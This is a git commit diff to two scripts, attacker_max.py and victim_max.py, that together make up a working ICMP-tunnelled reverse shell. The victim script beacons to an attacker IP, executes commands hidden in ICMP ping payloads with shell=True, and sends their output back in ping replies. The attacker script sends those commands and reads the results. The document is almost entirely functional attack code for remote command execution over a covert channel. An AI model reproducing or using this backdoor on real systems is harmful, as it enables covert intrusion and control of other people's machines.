3ea7ff3cca32fffe494247034e7ed01e37302c44
FATBO1 <maxneo14@gmail.com>
2024-06-16 01:41:58 +0800

    Somewhat working already

--- testing/attacker_max.py
+++ testing/attacker_max.py
@@ -3,8 +3,9 @@ from scapy.all import *
 
 # ICMP id 10 = 0xa
 def send_packet(ipsrc):
-    command = input("Shell: ")
-    ip_packet = IP(dst=ipsrc) / ICMP(id=10) / Raw(load=command)
+    command = str(input("Shell: "))
+    ip_packet = IP(dst=ipsrc) / ICMP(id=10, type=0) / Raw(load=command)
+    print("outgoing packet")
     ip_packet.show()
     send(ip_packet)
 
@@ -16,14 +17,14 @@ def check_packet_valid(packet):
             if packet.haslayer(Raw):
                 output = packet[Raw].load.decode()
                 print(output)
+                send_packet(ip_src)
             else:
                 send_packet(ip_src)
 
 
-
 def main():
-    
-    sniff(prn=check_packet_valid, filter='inbound', iface="eth0")
+
+    sniff(prn=check_packet_valid, filter="inbound", iface="eth0")
 
 
 if __name__ == "__main__":
--- testing/victim_max.py
+++ testing/victim_max.py
@@ -5,37 +5,42 @@ import sys
 attacker_ip = sys.argv[1]
 
 
-
 def send_icmp_to_attacker():
-    packet = IP(dst=attacker_ip) / ICMP(id=10)
+    packet = IP(dst=attacker_ip) / ICMP(id=10, type=8)
     send(packet)
-    print(f"sent to {attacker_ip}")
+    print(f"sent to attacker ip at: {attacker_ip}")
 
 
 # ICMP id 10 = 0xa
 def check_packet(packet):
-    if packet.haslayer(ICMP):
-        if packet[ICMP].id == 10:
-            # packet.show()
-            # print(packet[Raw].load)
-            if packet[Raw].load:
-                print("incoming packet")
-                packet.show()
-                result = subprocess.run(
-                    packet[Raw].load, capture_output=True, text=True
-                )
-                # print(result.stdout)
-                print("outgoing packet")
-                reply_packet = (
-                    IP(dst=packet[IP].src) / ICMP(id=10) / Raw(load=result.stdout)
-                )
-                reply_packet.show()
-                send(reply_packet)
+    try:
+        if packet.haslayer(ICMP) and packet[ICMP].type == 0:
+            if packet[ICMP].id == 10:
+                # packet.show()
+                # print(packet[Raw].load)
+                if packet[Raw].load:
+                    if packet[Ether].src != get_if_hwaddr("eth0"):
+                        print("incoming packet")
+                        packet.show()
+                        result = subprocess.run(
+                            packet[Raw].load, shell=True, capture_output=True, text=True
+                        )
+                        # print(result.stdout)
+                        print("outgoing packet")
+                        reply_packet = (
+                            IP(dst=packet[IP].src)
+                            / ICMP(id=10, type=0)
+                            / Raw(load=result.stdout)
+                        )
+                        reply_packet.show()
+                        send(reply_packet)
+    except Exception as e:
+        pass
 
 
 def main():
     send_icmp_to_attacker()
-    sniff(prn=check_packet, filter='inbound', iface="eth0")
+    sniff(prn=check_packet, iface="eth0")
 
 
 if __name__ == "__main__":
